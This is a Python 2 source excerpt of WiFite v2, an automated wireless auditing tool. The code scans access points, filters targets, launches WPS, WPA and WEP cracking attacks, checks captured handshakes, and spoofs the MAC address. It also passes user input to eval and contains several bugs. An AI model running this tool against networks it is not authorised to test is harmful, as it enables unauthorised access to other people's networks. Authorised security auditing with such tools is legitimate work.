    def is_timeout(self, time_started, targets, clients, quiet = True):
        timeouts=self.RUN_CONFIG.SCAN_TIMEOUT
        
        if timeouts == "":
            return False
        
        if isinstance(timeouts,int):
            timeout=int(timeouts)
            if timeout != 0 and timeout < time.time()-time_started:
                return True
        else:
    
            for timeout in timeouts.split(","):
                timeout=timeout.strip()
                if timeout.isdigit():
                    timeout=int(timeout)
                    if timeout != 0 and timeout < time.time()-time_started:
                        return True
                elif re.match('^n(<|>|=|>=|<=)(\d+)$',timeout):   #target
                    matches=re.match('^n(<|>|=|>=|<=)(\d+)$',timeout)
                    result=matches.groups()
                    num_of_targets=len(targets)
                    return eval(str(num_of_targets) + result[0] + result[1])
                #elif re.match('^t(<|>|=|>=|<=)(\d+)$',timeout):   #time
                elif re.match('^b([a-zA-z:0-9]+)(\+)?$',timeout): #BSSID
                    matches=re.match('^b([a-zA-z:0-9]+)(\+)?$',timeout)
                    result=matches.groups()
                    bssid=result[0].upper()
                    for target in targets:
                        if target.bssid.find(bssid) != -1:
                            if result[1] == None or (result[1]=="+" and target.count_clients(clients) > 0):
                                return True
                elif re.match('^e(.*)(\+)?$',timeout) or re.match('^e(.*)(\+)$',timeout): #ESSID
                    matches=re.match('^e(.*)(\+)?$',timeout)
                    if re.match('^e(.*)(\+)$',timeout): matches=re.match('^e(.*)(\+)$',timeout)
                    result=matches.groups()
                    ssid=result[0]

                    for target in targets:
                        if ssid == target.ssid or (ssid != "" and target.ssid.find(ssid) != -1):
                            if result[1] == None or (result[1]=="+" and target.count_clients(clients) > 0):
                                return True
                else:
                    if not quiet:
                        println_error("Unknown timeout criteria: %s",timeout)
        return False
        #return self.RUN_CONFIG.SCAN_TIMEOUT != 0 and self.RUN_CONFIG.SCAN_TIMEOUT < time.time()-time_started

    def print_target(self, target, clients, i, spacing):
        separator=' '
        print_text=""
        print_text+= '%s%3d%s' % (G, i + 1, W)
        print_text+= separator*spacing

        # SSID
        max_length=25
        if target.ssid == '':
            p = '(' + target.bssid + ')' 
            print_text+=O +  p.ljust(max_length) + W
        elif ( target.ssid.count('\x00') == len(target.ssid) ):
            p = '<Length ' + str(len(target.ssid)) + '>'
            print_text+= '%s' % C + p.ljust(max_length) + W
        elif len(target.ssid) <= max_length:
            print_text+= "%s" % C + target.ssid.ljust(max_length) + W
        else:
            print_text+= "%s" % C + target.ssid[0:max_length-3] + '...' + W
        print_text+= separator*spacing

        # BSSID
        if self.RUN_CONFIG.SHOW_MAC_IN_SCAN:
            print_text+= O + target.bssid + W
            print_text+= separator*spacing

        # Channel
        print_text+= G + target.channel.rjust(2)+ W
        print_text+= separator*spacing

        # Encryption
        if target.encryption.find("WEP") != -1:
            print_text+= G
        else:
            print_text+= O
        print_text+="%s" % target.encryption.strip().ljust(7) + W
        print_text+= separator*spacing

        # Power
        if target.power >= 55:
            col = G
        elif target.power >= 40:
            col = O
        else:
            col = R
        print_text+="%s%2d%s" % (col, target.power, W)
        print_text+=separator*spacing

        # WPS
        #if self.RUN_CONFIG.WPS_DISABLE:
        #    print "  %3s" % (O + 'n/a' + W),
        #else:
        print_text+="%3s" % (G + 'yes' + W if target.wps else R + ' no' + W)
        print_text+=separator*spacing

        # Clients
        count = target.count_clients(clients)
        if count > 0:
            print_text+="%s" % (G + str(count).rjust(6) + W)
        else:
            print_text+="%s" % (G + separator.rjust(6) + W)
        print print_text,
    def print_targets(self, targets, clients, max_rows=0, columns = 1, spacing = 1):
    #spacing -=1 # Python 2 will add space automatically between consecutive print statement
        headers=["No.","ESSID","BSSID","CH"," CIPHER","PW","WPS","CLIENT"]
        sizes=[3,25,17,2,7,2,3,6]
        shows=[True,True,self.RUN_CONFIG.SHOW_MAC_IN_SCAN,True,True,True,True,True]
        
        if len(targets) == 0:
            return
        header_text=""
        for i in range(0,columns):
            for j in range(0,len(headers)):
                if shows[j]:
                    header_text += headers[j].ljust(sizes[j]) + str(' ' * spacing)
            if i+1 != columns:
                header_text += " "
        header_text+="\n"
        
        for i in range(0,columns):
            for j in range(0,len(headers)):
                if shows[j]:
                    header_text+= '-' * sizes[j] + ' ' * spacing
            if i+1 != columns:
                header_text += " "
        
        print header_text

        

        total_targets=len(targets)
        if max_rows > 0 and rows > max_rows:
            total_targets=max_rows * columns
        
        rows=int(math.ceil(total_targets/(0.0 + columns)))

        for i in range(0,rows):
            #if max_rows > 0 and i>=max_rows:
            #    break
            for j in range(0,columns):
                idx=rows*j+i
                if idx<total_targets:
                    self.print_target(targets[idx],clients,idx,spacing)
                    if j != columns -1:
                        print '',
            #if i+1 != columns:
            #    print ' ',
            print ''
            i+=1
    def filter_targets(self, targets, clients, inputs):
        remove = False
        victims=[]
        if inputs == '':
           return targets
        for input in inputs.split(','):
            r=input.strip()
            if input == '':
                continue
            if r == 'all':
                victims = targets[:]
                continue

            if r[0:1] == '-' or r[0:1] == '=': #Remove
               remove = True
               r=r[1:]
        
            matches=re.match('^(opn|wep|wpa)(\d+|\+)?$',r)
            if matches != None:
                result=matches.groups()
                for target in targets:
                    if target.encryption.lower().find(result[0]) != -1:
                        num_of_clients=target.count_clients(clients)
                        
                        if result[1]==None or result[1] == '+' and num_of_clients > 0 or result[1].isdigit() and num_of_clients == int(result[1]):
                            if remove:
                                try:
                                    victims.remove(target)
                                except ValueError:
                                    pass
                            else:
                                try:
                                    victims.index(target)
                                except ValueError:
                                    victims.append(target)
            elif re.match('^wps(0|1)$',r):
                matches=re.match('^wps(0|1)$',r)
                result=matches.groups()
                comparison=bool(int(result[0]))
                #print comparison
                if remove:
                    for victim in victims:
                        if victim.wps==comparison: 
                                try:
                                    victims.remove(target)
                                except ValueError:
                                    pass

                else:
                    for target in targets:
                        if target.wps==comparison:
                                try:
                                    victims.index(target)
                                except ValueError:
                                    victims.append(target)
            elif re.match('^e(.*)(\+)?$',r) or re.match('^e(.*)(\+)$',r): #ESSID
                matches=re.match('^e(.*)(\+)?$',r)
                if re.match('^e(.*)(\+)$',r): matches=re.match('^e(.*)(\+)$',r)
                result=matches.groups()
                ssid=result[0]
                if remove:
                    for victim in victims:
                        if ssid == victim.ssid or (ssid != "" and victim.ssid.find(ssid) != -1):
                            if result[1] == None or (result[1] == "+" and victim.count_clients(clients) > 0):
                                victims.remove(victim) 
                            
                else:
                    for target in targets:
                        if ssid == target.ssid or (ssid != "" and target.ssid.find(ssid) != -1):
                            if result[1] == None or (result[1] == "+" and target.count_clients(clients) > 0):
                                try:
                                    victims.index(target)
                                except ValueError:
                                    victims.append(target)
            elif re.match('^b([a-zA-z:0-9]+)(\+)?$',r):
                matches=re.match('^b([a-zA-z:0-9]+)(\+)?$',r)
                result=matches.groups()
                bssid=result[0].upper()
                #print result[0]
                if remove:
                    for victim in victims:
                        if victim.bssid.find(bssid) != -1:
                            if result[1] == None or (result[1] == "+" and victim.count_clients(clients) > 0):
                                victims.remove(victim) 
                else:
                    for target in targets:
                        if target.bssid.find(bssid) != -1:
                                if result[1] == None or (result[1] == "+" and target.count_clients(clients) > 0):
                                    try:
                                        victims.index(target)
                                    except ValueError:
                                        victims.append(target)
            elif re.match('^c([1-9]|1[012])(\-([1-9]|1[012]))?$',r):
                matches=re.match('^c([1-9]|1[012])(\-([1-9]|1[012]))?$',r)
                result=matches.groups()
                if result[1] == None:
                    cx = int(result[0])
                    if remove:
                        for victim in victims:
                            if victim.channel == cx:
                                victims.remove(victim) 
                    else:
                        for target in targets:
                            if target.channel == cx:
                                    try:
                                        victims.index(target)
                                    except ValueError:
                                        victims.append(target)
                else:
                    cx = int(result[0])
                    cy = int(result[2])
                    if cx > cy:
                            println_warning("Invalid input: %s " % (O + r + W))
                    else:
                        if remove:
                            for victim in victims:
                                if victim.channel >= cx and victim.channel <= cy:
                                    victims.remove(victim) 
                        else:
                            for target in targets:
                                if target.channel >= cx and target.channel <= cy:
                                        try:
                                            victims.index(target)
                                        except ValueError:
                                            victims.append(target)

            elif re.match('^\d+\-\d+$',r): #Range
                (sx, sy) = r.split('-')
                x = int(sx)
                y = int(sy) + 1
                for v in xrange(x, y):
                    target=targets[v - 1]
                    if remove:
                        try:
                            victims.remove(target)
                        except ValueError:
                            pass
                    else:
                        try:
                            victims.index(target)
                        except ValueError:
                            victims.append(target)
            elif re.match('^p(<|>|=|>=|<=)(\d+)$',r): #Power
                matches=re.match('^p(<|>|=|>=|<=)(\d+)$',r)
                result=matches.groups()
                for target in targets:
                    if eval(str(target.power) + result[0] + result[1]):
                        if remove:
                                try:
                                    victims.remove(target)
                                except ValueError:
                                    pass
                        else:
                                try:
                                    victims.index(target)
                                except ValueError:
                                    victims.append(target)

            elif r.isdigit():
                i=int(r)
                if i>0 and i<= len(targets):
                    target=targets[i-1]
                    if remove:
                        try:
                            victims.remove(target)
                        except ValueError:
                            pass
                    else:
                        try:
                            victims.index(target)
                        except ValueError:
                            victims.append(target)
                        
                else:
                        println_warning("invalid input: %s " % (O + input + W))
            else:
                println_warning("invalid input: %s " % (O + input + W))

        return victims
    def Start(self):
        
        self.RUN_CONFIG.ConfirmCorrectPlatform()
        self.RUN_CONFIG.ConfirmRunningAsRoot()
        self.RUN_CONFIG.handle_args()
        self.RUN_CONFIG.CreateTempFolder()

        if not self.programs_check():  # Ensure required programs are installed.
            self.RUN_CONFIG.exit_gracefully(1)
        # Use an interface already in monitor mode if it has been provided,
        if self.RUN_CONFIG.MONITOR_IFACE != '':
            iface = self.RUN_CONFIG.MONITOR_IFACE
        else:
            # The "get_iface" method anonymizes the MAC address (if needed)
            # and puts the interface into monitor mode.
            iface = self.get_iface()
        
        self.RUN_CONFIG.THIS_MAC = get_mac_address(iface)  # Store current MAC address

        (targets, clients) = self.scan(iface=iface, channel=self.RUN_CONFIG.TARGET_CHANNEL)

        try:
            index = 0
            for index,target in enumerate(targets):
                # Check if we have already cracked this target
                for already in RUN_CONFIG.CRACKED_TARGETS:
                    if already.bssid == target.bssid:
                        if RUN_CONFIG.SHOW_ALREADY_CRACKED == True:
                            println_info('you have already cracked %s (%s), key is "%s" !' % (C + already.ssid + W , G + already.bssid + W, G + already.key + W))
                            ri = raw_input(
                                GR + ' [+] ' + W + 'do you want to crack this access point again? (' + G + 'y/' + O + 'n' + W + '): ')
                            if ri.lower() == 'n':
                                targets.pop(index)
                        else:
                            targets.pop(index)
                        break

                # Check if handshakes already exist, ask user whether to skip targets or save new handshakes
                handshake_file = RUN_CONFIG.WPA_HANDSHAKE_DIR + str(target) + '.cap'
                if os.path.exists(handshake_file):

                    
                    if not RUN_CONFIG.WPA_RECAPTURE_HS:
                        targets.pop(index)
                        println_info('you already have a handshake file for %s (%s) at "%s", target skipped.' % (C + target.ssid + W), (C + target.bssid + W), (G + handshake_file + W))    
                    else:
                        println_info('you already have a handshake file for %s (%s) at "%s", will be overwritten.' % (C + target.ssid + W), (C + target.bssid + W), (G + handshake_file + W))
                    #println_info('do you want to ' + G + '[s]kip' + W + ', ' + O + '[c]apture again' + W + ', or ' + R + '[o]verwrite' + W + '?')
                    #ri = 's'
                    #while ri != 's' and ri != 'c' and ri != 'o':
                    #    ri = raw_input(
                    #        GR + ' [+] ' + W + 'enter ' + G + 's' + W + ', ' + O + 'c,' + W + ' or ' + R + 'o' + W + ': ' + G).lower()
                    #print W + "\b",
                    #if ri == 's':
                    #    targets.pop(index)
                    #    index -= 1
                    #elif ri == 'o':
                    #    remove_file(handshake_file)
                    #    continue

        except KeyboardInterrupt:
            print '\n ' + R + '(^C)' + O + ' interrupted\n'
            self.RUN_CONFIG.exit_gracefully(0)

        wpa_success = 0
        wep_success = 0
        wpa_total = 0
        wep_total = 0

        self.RUN_CONFIG.TARGETS_REMAINING = len(targets)
        for t in targets:
            self.RUN_CONFIG.TARGETS_REMAINING -= 1

            # Build list of clients connected to target
            ts_clients = []
            for c in clients:
                if c.station == t.bssid:
                    ts_clients.append(c)

            print ''
            if t.encryption.find('WPA') != -1:
                need_handshake = True
                if not self.RUN_CONFIG.WPS_ATTACK_DISABLE and t.wps:
                    wps_attack = WPSAttack(iface, t, self.RUN_CONFIG)
                    need_handshake = not wps_attack.RunAttack()
                    wpa_total += 1

                if not need_handshake: wpa_success += 1
                if self.RUN_CONFIG.TARGETS_REMAINING < 0: break

                if not self.RUN_CONFIG.WPA_ATTACK_DISABLE and need_handshake:
                    wpa_total += 1
                    wpa_attack = WPAAttack(iface, t, ts_clients, self.RUN_CONFIG)
                    if wpa_attack.RunAttack():
                        wpa_success += 1

            elif t.encryption.find('WEP') != -1:
                wep_total += 1
                wep_attack = WEPAttack(iface, t, ts_clients, self.RUN_CONFIG)
                if wep_attack.RunAttack():
                    wep_success += 1
            elif t.encryption.find("OPN") != -1:
                println_info('OPN network is not encrypted!')
            else:
                println_error('unknown encryption: ' + t.encryption)

            # If user wants to stop attacking
            if self.RUN_CONFIG.TARGETS_REMAINING <= 0: break

        if wpa_total + wep_total > 0:
            # Attacks are done! Show results to user
            print ''
            println_info('%s%d attack%s completed:%s' % (G, wpa_total + wep_total, '' if wpa_total + wep_total == 1 else 's', W))
            print ''
            if wpa_total > 0:
                if wpa_success == 0:
                    print GR + ' [+]' + R,
                elif wpa_success == wpa_total:
                    print GR + ' [+]' + G,
                else:
                    print GR + ' [+]' + O,
                print '%d/%d%s WPA attacks succeeded' % (wpa_success, wpa_total, W)

                for finding in self.RUN_CONFIG.WPA_FINDINGS:
                    print '        ' + C + finding + W

            if wep_total > 0:
                if wep_success == 0:
                    print GR + ' [+]' + R,
                elif wep_success == wep_total:
                    print GR + ' [+]' + G,
                else:
                    print GR + ' [+]' + O,
                print '%d/%d%s WEP attacks succeeded' % (wep_success, wep_total, W)

                for finding in self.RUN_CONFIG.WEP_FINDINGS:
                    print '        ' + C + finding + W

            caps = len(self.RUN_CONFIG.WPA_CAPS_TO_CRACK)
            if caps > 0 and not self.RUN_CONFIG.WPA_DONT_CRACK:
                println_info('starting ' + G + 'WPA cracker' + W + ' on %s%d handshake%s' % (
                G, caps, W if caps == 1 else 's'))
                for cap in self.RUN_CONFIG.WPA_CAPS_TO_CRACK:
                    wpa_crack(cap)

        print ''
        self.RUN_CONFIG.exit_gracefully(0)
    def parse_row_to_client(self, cells):
        bssid = re.sub(r'[^a-zA-Z0-9:]', '', cells[0].strip())
        station = re.sub(r'[^a-zA-Z0-9:]', '', cells[5].strip())
        power = cells[3].strip()
        essid = ",".join(cells[6:]).strip()
        if station != 'notassociated':
            return Client(bssid, station, power, essid)
        return None
    def parse_row_to_target(self, row):
        if len(row) < 14:
            return None
        enc = row[5].strip()
        wps = False

        #if enc.find('WPA') == -1 and enc.find('WEP') == -1: continue
        #if self.RUN_CONFIG.WEP_DISABLE and enc.find('WEP') != -1: continue
        #if self.RUN_CONFIG.WPA_DISABLE and self.RUN_CONFIG.WPS_DISABLE and enc.find(
        #        'WPA') != -1: continue
        if enc == "WPA2WPA":
        #    enc = "WPA2"
            wps = True
        power = int(row[8].strip())

        ssid = row[13].strip()
        ssidlen = int(row[12].strip())
        ssid = ssid[:ssidlen]

        if power < 0: power += 100
        
        t = Target(row[0].strip(), power, row[10].strip(), row[3].strip(), enc, ssid, wps)
        #t.wps = wps
        return t
    def parse_csv(self, filename):
        """
            Parses given lines from airodump-ng CSV file.
            Returns tuple: List of targets and list of clients.
        """
        if not os.path.exists(filename): return ([], [])
        targets = []
        clients = []
        try:
            hit_clients = False
            with open(filename, 'rb') as csvfile:
                targetreader = csv.reader((line.replace('\0', '') for line in csvfile), delimiter=',')

                for row in targetreader:

                    if len(row) < 2:
                        continue
                    if not hit_clients:
                        if len(row) < 1: continue
                        if row[0].strip() == 'Station MAC': hit_clients = True
                        if row[0].strip() == 'BSSID' or row[0].strip() == 'Station Mac': continue
                        if len(row) < 14: continue
                        try:
                            target=self.parse_row_to_target(row)
                            if target:
                                targets.append(target)
                        except ValueError:
                            println_error("Error prasing %s" % ",".join(row))
                            pass
                    else:
                        
                        if len(row) < 6:
                            continue
                            
                        client=self.parse_row_to_client(row)
                        if client:
                            clients.append(client)
        except IOError as e:
            println_error("I/O error({0}): {1}".format(e.errno, e.strerror))

        return (targets, clients)

    def analyze_capfile(self, capfile):
        """
            Analyzes given capfile for handshakes using various programs.
            Prints results to console.
        """
        # we're not running an attack
        wpa_attack = WPAAttack(None, None, None)

        if self.RUN_CONFIG.TARGET_ESSID == '' and self.RUN_CONFIG.TARGET_BSSID == '':
            println_error('target ssid and bssid are required to check for handshakes')
            println_error('please enter essid (access point name) using --e <name>')
            println_error('and/or target bssid (mac address) using --b <mac>\n')
            # exit_gracefully(1)

        if self.RUN_CONFIG.TARGET_BSSID == '':
            # Get the first BSSID found in tshark!
            self.RUN_CONFIG.TARGET_BSSID = get_bssid_from_cap(self.RUN_CONFIG.TARGET_ESSID, capfile)
            # if TARGET_BSSID.find('->') != -1: TARGET_BSSID == ''
            if self.RUN_CONFIG.TARGET_BSSID == '':
                println_error('unable to guess BSSID from ESSID!')
            else:
                println_info('guessed bssid: %s' % (G + self.RUN_CONFIG.TARGET_BSSID + W))

        if self.RUN_CONFIG.TARGET_BSSID != '' and self.RUN_CONFIG.TARGET_ESSID == '':
            self.RUN_CONFIG.TARGET_ESSID = get_essid_from_cap(self.RUN_CONFIG.TARGET_BSSID, capfile)

        println_info(' checking for handshakes in %s' % (G + capfile + W))

        t = Target(self.RUN_CONFIG.TARGET_BSSID, '', '', '', 'WPA', self.RUN_CONFIG.TARGET_ESSID)

        if file_search('pyrit'):
            result = wpa_attack.has_handshake_pyrit(t, capfile)
            println_info('   ' + G + 'pyrit' + W + ':\t\t\t %s' % (
            G + 'found!' + W if result else O + 'not found' + W))
        else:
            println_error('program not found: pyrit')
        if file_search('cowpatty'):
            result = wpa_attack.has_handshake_cowpatty(t, capfile, nonstrict=True)
            println_info('   ' + G + 'cowpatty' + W + ' (nonstrict):\t %s' % (
            G + 'found!' + W if result else O + 'not found' + W))
            result = wpa_attack.has_handshake_cowpatty(t, capfile, nonstrict=False)
            println_info('   ' + G + 'cowpatty' + W + ' (strict):\t %s' % (
            G + 'found!' + W if result else O + 'not found' + W))
        else:
            println_error('program not found: cowpatty')
        if file_search('tshark'):
            result = wpa_attack.has_handshake_tshark(t, capfile)
            println_info('   ' + G + 'tshark' + W + ':\t\t\t %s' % (
            G + 'found!' + W if result else O + 'not found' + W))
        else:
            println_error('program not found: tshark')
        if file_search('aircrack-ng'):
            result = wpa_attack.has_handshake_aircrack(t, capfile)
            println_info('   ' + G + 'aircrack-ng' + W + ':\t\t %s' % (
            G + 'found!' + W if result else O + 'not found' + W))
        else:
            println_error('program not found: aircrack-ng')

        print ''

        self.RUN_CONFIG.exit_gracefully(0)


##################
# MAIN FUNCTIONS #
##################

##############################################################

### End Classes
 
def println_debug(message, time_started = -1):
    global RUN_CONFIG
    if RUN_CONFIG.DEBUG:
        print G + ' [#] ' + W + message + W

def print_info(message, time_started = -1):
    time_text=''
    if time_started > -1:
        time_text=sec_to_hms(time.time() - time_started) 
    print GR + ' [+] ' + W + time_text + message + W,

def println_info(message, time_started = -1):
    time_text=''
    if time_started > -1:
        time_text=sec_to_hms(time.time() - time_started) 
    print GR + ' [+] ' + W + time_text + message + W

def print_error(message, time_started = -1):
    time_text=''
    if time_started > -1:
        time_text=sec_to_hms(time.time() - time_started) 
    print R + ' [!] ' + O + time_text + message + W,

def println_error(message, time_started = -1):
    time_text=''
    if time_started > -1:
        time_text=sec_to_hms(time.time() - time_started) 
    print R + ' [!] ' + O + time_text + message + W

def print_warning(message, time_started = -1):
    time_text=''
    if time_started > -1:
        time_text=sec_to_hms(time.time() - time_started) 
    print O + ' [!] ' + R + time_text + message + W,

def println_warning(message, time_started = -1):
    time_text=''
    if time_started > -1:
        time_text=sec_to_hms(time.time() - time_started) 
    print O + ' [!] ' + R + time_text + message + W
def rename(old, new):
    """
        Renames file 'old' to 'new', works with separate partitions.
        Thanks to hannan.sadar
    """
    try:
        os.rename(old, new)
    except os.error, detail:
        if detail.errno == errno.EXDEV:
            try:
                copy(old, new)
            except:
                os.unlink(new)
                raise
                os.unlink(old)
        # if desired, deal with other errors
        else:
            raise


def banner(RUN_CONFIG):
    """
        Displays ASCII art of the highest caliber.
    """
    print ''
    print G + "  .;'                     `;,    "
    print G + " .;'  ,;'             `;,  `;,   " + W + "WiFite v2 (r" + str(RUN_CONFIG.REVISION) + ")"
    print G + ".;'  ,;'  ,;'     `;,  `;,  `;,  "
    print G + "::   ::   :   " + GR + "( )" + G + "   :   ::   ::  " + GR + "automated wireless auditor"
    print G + "':.  ':.  ':. " + GR + "/_\\" + G + " ,:'  ,:'  ,:'  "
    print G + " ':.  ':.    " + GR + "/___\\" + G + "    ,:'  ,:'   " + GR + "designed for Linux"
    print G + "  ':.       " + GR + "/_____\\" + G + "      ,:'     "
    print G + "           " + GR + "/       \\" + G + "             "
    print W

def do_update(buff):
    
    # Create/save the new script
    f = open('wifite_new.py', 'w')
    f.write(buff)
    f.close()

    # The filename of the running script
    this_file = __file__
    if this_file.startswith('./'):
        this_file = this_file[2:]

    # create/save a shell script that replaces this script with the new one
    f = open('update_wifite.sh', 'w')
    f.write('''#!/bin/sh\n
               rm -rf ''' + this_file + '''\n
               mv wifite_new.py ''' + this_file + '''\n
               rm -rf update_wifite.sh\n
               chmod +x ''' + this_file + '''\n
              ''')
    f.close()

    # Change permissions on the script
    returncode = call(['chmod', '+x', 'update_wifite.sh'])
    if returncode != 0:
        println_error('permission change returned unexpected code: ' + str(returncode))
        self.exit_gracefully(1)
    # Run the script
    returncode = call(['sh', 'update_wifite.sh'])
    if returncode != 0:
        println_error('update script returned unexpected code: ' + str(returncode))
        self.exit_gracefully(1)

    println_info('updated!' + W + ' type "./' + this_file + '" to run again')
def get_file(url):
    try:
        sock = urllib.urlopen(url)
        response = sock.read()
    except IOError:
        return False

    return response

def get_revision(buff):
    """
        Gets latest revision # from buffer
        Returns : revision#
    """
    irev = -1

    # get the revision
    start = buff.find('REVISION = ')
    stop = buff.find(";", start)
    if start != -1 and stop != -1:
        start += 11
        rev = buff[start:stop]
        try:
            irev = int(rev)
        except ValueError:
            rev = rev.split('\n')[0]
            print R + '[+] invalid revision number: "' + rev + '"'
    return irev



###########################
# WIRELESS CARD FUNCTIONS #
###########################




######################
# SCANNING FUNCTIONS #
######################

def wps_check_targets(targets, cap_file, verbose=True):
    """
        Uses reaver's "walsh" (or wash) program to check access points in cap_file
        for WPS functionality. Sets "wps" field of targets that match to True.
    """
    global RUN_CONFIG

    if not file_search('walsh') and not file_search('wash'):
        RUN_CONFIG.WPS_ATTACK_DISABLE = True  # Tell 'scan' we were unable to execute walsh
        return
    program_name = 'walsh' if file_search('walsh') else 'wash'

    if len(targets) == 0 or not os.path.exists(cap_file): return
    if verbose:
        println_info('checking for ' + G + 'WPS compatibility' + W + '...',)
        stdout.flush()

    cmd = [program_name,
           '-f', cap_file,
           '-C']  # ignore Frame Check Sum errors
    proc_walsh = Popen(cmd, stdout=PIPE, stderr=DN)
    proc_walsh.wait()
    for line in proc_walsh.communicate()[0].split('\n'):
        if line.strip() == '' or line.startswith('Scanning for'): continue
        bssid = line.split(' ')[0]

        for t in targets:
            if t.bssid.lower() == bssid.lower():
                t.wps = True
    if verbose:
        print 'done'
    #removed = 0
    #if not RUN_CONFIG.WPS_DISABLE and RUN_CONFIG.WPA_DISABLE:
    #    i = 0
    #    while i < len(targets):
    #        if not targets[i].wps and targets[i].encryption.find('WPA') != -1:
    #            removed += 1
    #           targets.pop(i)
    #        else:
    #           i += 1
    #   if removed > 0 and verbose: print GR + ' [+]' + O + ' removed %d non-WPS-enabled targets%s' % (removed, W)


def print_and_exec(cmd):
    """
        Prints and executes command "cmd". Also waits half a second
        Used by rtl8187_fix (for prettiness)
    """
    print '\r                                                        \r',
    stdout.flush()
    print_info('executing: ' + O + ' '.join(cmd) + W)
    stdout.flush()
    call(cmd, stdout=DN, stderr=DN)
    time.sleep(0.1)


####################
# HELPER FUNCTIONS #
####################

def remove_airodump_files(prefix):
    """
        Removes airodump output files for whatever file prefix ('wpa', 'wep', etc)
        Used by wpa_get_handshake() and attack_wep()
    """
    global RUN_CONFIG
    remove_file(prefix + '-01.cap')
    remove_file(prefix + '-01.csv')
    remove_file(prefix + '-01.kismet.csv')
    remove_file(prefix + '-01.kismet.netxml')
    for filename in os.listdir(RUN_CONFIG.temp):
        if filename.lower().endswith('.xor'): remove_file(RUN_CONFIG.temp + filename)
    for filename in os.listdir('.'):
        if filename.startswith('replay_') and filename.endswith('.cap'):
            remove_file(filename)
        if filename.endswith('.xor'): remove_file(filename)
    # Remove .cap's from previous attack sessions
    """i = 2
    while os.path.exists(temp + 'wep-' + str(i) + '.cap'):
        os.remove(temp + 'wep-' + str(i) + '.cap')
        i += 1
    """


def remove_file(filename):
    """
        Attempts to remove a file. Does not throw error if file is not found.
    """
    try:
        os.remove(filename)
    except OSError:
        pass

def file_search(program):
    """
        Uses 'which' or 'locate' (linux command) to check if a program is installed.
    """
    searchers=[['which','',''],['locate','/','$']] #['whereis','',''],
    for searcher in searchers:
        proc = Popen([searcher[0], searcher[1] + program + searcher[2]], stdout=PIPE, stderr=PIPE)
        txt = proc.communicate()
        if txt[0].strip() != '' and txt[1].strip() == '':
            return txt[0].strip().split("\n")[0]

    return False


def sec_to_hms(sec):
    """
        Converts integer sec to h:mm:ss format
    """
    if sec <= -1: return '[endless]'
    h = sec / 3600
    sec %= 3600
    m = sec / 60
    sec %= 60
    return '[%d:%02d:%02d]' % (h, m, sec)


def send_interrupt(process):
    """
        Sends interrupt signal to process's PID.
    """
    try:
        os.kill(process.pid, SIGINT)
        # os.kill(process.pid, SIGTERM)
    except OSError:
        pass  # process cannot be killed
    except TypeError:
        pass  # pid is incorrect type
    except UnboundLocalError:
        pass  # 'process' is not defined
    except AttributeError:
        pass  # Trying to kill "None"


def get_mac_address(iface):
    """
        Returns MAC address of "iface".
    """
    proc = Popen(['ifconfig', iface], stdout=PIPE, stderr=DN)
    proc.wait()
    mac = ''
    first_line = proc.communicate()[0].split('\n')[0]
    for word in first_line.split(' '):
        if word != '': mac = word
    if mac.find('-') != -1: mac = mac.replace('-', ':')
    if len(mac) > 17: mac = mac[0:17]
    return mac


def generate_random_mac(old_mac):
    """
        Generates a random MAC address.
        Keeps the same vender (first 6 chars) of the old MAC address (old_mac).
        Returns string in format old_mac[0:9] + :XX:XX:XX where X is random hex
    """
    random.seed()
    new_mac = old_mac[:8].lower().replace('-', ':')

    for i in xrange(0, 6):
        if i % 2 == 0: new_mac += ':'
        new_mac += '0123456789abcdef'[random.randint(0, 15)]

    # Prevent generating the same MAC address via recursion.
    if new_mac == old_mac:
        new_mac = generate_random_mac(old_mac)
    return new_mac


def set_mac_address(iface, mac):
    call(['ifconfig', iface, 'down'])
    proc = Popen(['ifconfig', iface, 'hw', 'ether', mac], stdout=PIPE, stderr=DN)
    proc.wait()
    call(['ifconfig', iface, 'up'], stdout=DN, stderr=DN)
    return True
def mac_anonymize(iface):
    """
        Changes MAC address of 'iface' to a random MAC.
        Only randomizes the last 6 digits of the MAC, so the vender says the same.
        Stores old MAC address and the interface in ORIGINAL_IFACE_MAC
    """
    global RUN_CONFIG
    if RUN_CONFIG.DO_NOT_CHANGE_MAC: return False
    if not file_search('ifconfig'): return False

    # Store old (current) MAC address
    old_mac=get_mac_address(iface)
    RUN_CONFIG.ORIGINAL_IFACE_MAC = (iface, old_mac)
    new_mac = generate_random_mac(old_mac)

    print GR + " [+]" + W + " changing %s's MAC from %s to %s..." % (G + iface + W, G + old_mac + W, O + new_mac + W),
    stdout.flush()
    set_mac_address(iface,new_mac)
    print 'done'
    return True

def mac_change_back():
    """
        Changes MAC address back to what it was before attacks began.
    """
    global RUN_CONFIG
    iface = RUN_CONFIG.ORIGINAL_IFACE_MAC[0]
    old_mac = RUN_CONFIG.ORIGINAL_IFACE_MAC[1]
    if iface == '' or old_mac == '': return

    print GR + " [+]" + W + " changing %s's mac back to %s..." % (G + iface + W, G + old_mac +W),
    stdout.flush()
    set_mac_address(iface, old_mac)
    print "done"


def get_essid_from_cap(bssid, capfile):
    """
        Attempts to get ESSID from cap file using BSSID as reference.
        Returns '' if not found.
    """
    if not file_search('tshark'): return ''

    cmd = ['tshark',
           '-r', capfile,
           '-R', 'wlan.fc.type_subtype == 0x05 && wlan.sa == %s' % bssid,
           '-n']
    proc = Popen(cmd, stdout=PIPE, stderr=DN)
    proc.wait()
    for line in proc.communicate()[0].split('\n'):
        if line.find('SSID=') != -1:
            essid = line[line.find('SSID=') + 5:]
            println_info('guessed essid: %s' % (G + essid + W))
            return essid
    println_error('unable to guess essid!')
    return ''


def get_bssid_from_cap(essid, capfile):
    """
        Returns first BSSID of access point found in cap file.
        This is not accurate at all, but it's a good guess.
        Returns '' if not found.
    """
    global RUN_CONFIG

    if not file_search('tshark'): return ''

    # Attempt to get BSSID based on ESSID
    if essid != '':
        cmd = ['tshark',
               '-r', capfile,
               '-R', 'wlan_mgt.ssid == "%s" && wlan.fc.type_subtype == 0x05' % (essid),
               '-n',  # Do not resolve MAC vendor names
               '-T', 'fields',  # Only display certain fields
               '-e', 'wlan.sa']  # souce MAC address
        proc = Popen(cmd, stdout=PIPE, stderr=DN)
        proc.wait()
        bssid = proc.communicate()[0].split('\n')[0]
        if bssid != '': return bssid

    cmd = ['tshark',
           '-r', capfile,
           '-R', 'eapol',
           '-n']
    proc = Popen(cmd, stdout=PIPE, stderr=DN)
    proc.wait()
    for line in proc.communicate()[0].split('\n'):
        if line.endswith('Key (msg 1/4)') or line.endswith('Key (msg 3/4)'):
            while line.startswith(' ') or line.startswith('\t'): line = line[1:]
            line = line.replace('\t', ' ')
            while line.find('  ') != -1: line = line.replace('  ', ' ')
            return line.split(' ')[2]
